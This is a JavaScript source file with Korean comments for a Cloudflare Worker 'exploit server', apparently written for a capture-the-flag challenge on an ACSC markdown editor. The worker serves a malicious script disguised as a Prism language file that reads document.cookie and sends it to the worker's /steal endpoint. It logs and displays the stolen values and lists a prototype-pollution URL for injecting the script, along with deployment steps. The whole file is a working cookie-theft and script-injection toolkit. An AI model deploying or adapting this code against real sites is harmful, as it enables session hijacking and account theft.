/**
 * Cloudflare Workers - All-in-one Exploit Server
 * ═══════════════════════════════════════════════
 * 
 * JS 서빙 + 쿠키 수신을 하나의 Worker에서 처리
 * 
 * 설정 방법:
 * 1. https://dash.cloudflare.com 접속
 * 2. Workers & Pages → Create Application → Create Worker
 * 3. 이 코드 붙여넣기 → Deploy
 * 4. Worker URL 복사 (예: https://xxx.workers.dev)
 * 
 * 사용:
 * - /prism-*.min.js 요청 → 악성 JS 반환
 * - /steal?flag=xxx 요청 → 콘솔에 로그
 * - /log 접속 → 수집된 플래그 확인
 */

// 메모리에 플래그 저장 (실제로는 KV 사용 권장)
let collectedFlags = [];

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;
    
    // CORS 헤더
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'Access-Control-Allow-Headers': '*',
    };
    
    // OPTIONS 요청 처리
    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }
    
    // ═══════════════════════════════════════════
    // 1. Prism 언어 파일 요청 → 악성 JS 반환
    // ═══════════════════════════════════════════
    if (path.includes('prism-') && path.endsWith('.min.js')) {
      console.log(`[*] Prism file requested: ${path}`);
      
      // Worker 자신의 URL로 쿠키 전송
      const workerUrl = url.origin;
      
      const maliciousJS = `
(function(){
  var c = document.cookie;
  console.log('[Exploit] Stealing cookie:', c);
  new Image().src = '${workerUrl}/steal?flag=' + encodeURIComponent(c);
  fetch('${workerUrl}/steal?flag=' + encodeURIComponent(c));
})();
`;
      
      return new Response(maliciousJS, {
        headers: {
          'Content-Type': 'application/javascript',
          ...corsHeaders
        }
      });
    }
    
    // ═══════════════════════════════════════════
    // 2. 쿠키 수신 엔드포인트
    // ═══════════════════════════════════════════
    if (path === '/steal') {
      const flag = url.searchParams.get('flag') || 'no flag';
      const timestamp = new Date().toISOString();
      
      console.log(`\n${'='.repeat(50)}`);
      console.log(`[+] FLAG RECEIVED at ${timestamp}`);
      console.log(`[+] ${decodeURIComponent(flag)}`);
      console.log(`${'='.repeat(50)}\n`);
      
      // 메모리에 저장
      collectedFlags.push({ flag: decodeURIComponent(flag), time: timestamp });
      
      return new Response('OK', { headers: corsHeaders });
    }
    
    // ═══════════════════════════════════════════
    // 3. 수집된 플래그 확인
    // ═══════════════════════════════════════════
    if (path === '/log' || path === '/flags') {
      return new Response(JSON.stringify(collectedFlags, null, 2), {
        headers: {
          'Content-Type': 'application/json',
          ...corsHeaders
        }
      });
    }
    
    // ═══════════════════════════════════════════
    // 4. 메인 페이지 - 사용법 안내
    // ═══════════════════════════════════════════
    return new Response(`
<!DOCTYPE html>
<html>
<head><title>Exploit Server</title></head>
<body>
<h1>🎯 ACSC Markdown Editor Exploit Server</h1>
<h2>Endpoints:</h2>
<ul>
  <li><code>/prism-*.min.js</code> - Malicious JS payload</li>
  <li><code>/steal?flag=xxx</code> - Cookie receiver</li>
  <li><code>/log</code> - View collected flags</li>
</ul>

<h2>Usage:</h2>
<pre>
# Prototype Pollution URL:
__proto__[languages_path]=${url.origin}/

# Full Report URL:
/report?save=0%26__proto__[languages_path]=${encodeURIComponent(url.origin + '/')}
</pre>

<h2>Collected Flags:</h2>
<pre id="flags">Loading...</pre>

<script>
fetch('/log').then(r=>r.text()).then(t=>document.getElementById('flags').textContent=t);
</script>
</body>
</html>
    `, {
      headers: { 'Content-Type': 'text/html' }
    });
  },
};
